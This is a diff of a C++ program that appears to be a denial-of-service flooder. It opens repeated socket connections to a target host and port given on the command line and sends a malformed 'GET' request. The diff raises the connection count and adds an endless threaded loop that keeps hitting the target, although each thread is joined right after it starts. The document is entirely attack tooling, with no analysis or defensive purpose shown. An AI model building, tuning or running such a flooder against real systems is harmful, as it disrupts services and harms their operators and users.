@@ -1,13 +1,15 @@
 #include <iostream>
 #include <cstring>
+#include <thread>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 using namespace std;
 
 // Variables
-int socketIter = 300;
+int socketIter = 700;
 const char *getReq = "GET / HTTP 1.1  42069 \r\n";
+int threadCount = 30;
 
 // Socket
 int socketOps(const char *target,int port){
@@ -47,6 +49,13 @@ int socketOps(const char *target,int port){
 
 // MAIN
 int main(int argc, char *argv[]){
-	socketOps(argv[1],atoi(argv[2]));
+	// Threading
+	while (true) {
+		for (int i = 0; i<threadCount; i++){
+			thread t(socketOps, argv[1],atoi(argv[2]));
+			t.join();
+		};
+	};
+	//socketOps(argv[1],atoi(argv[2]));
 	return 0;
 }
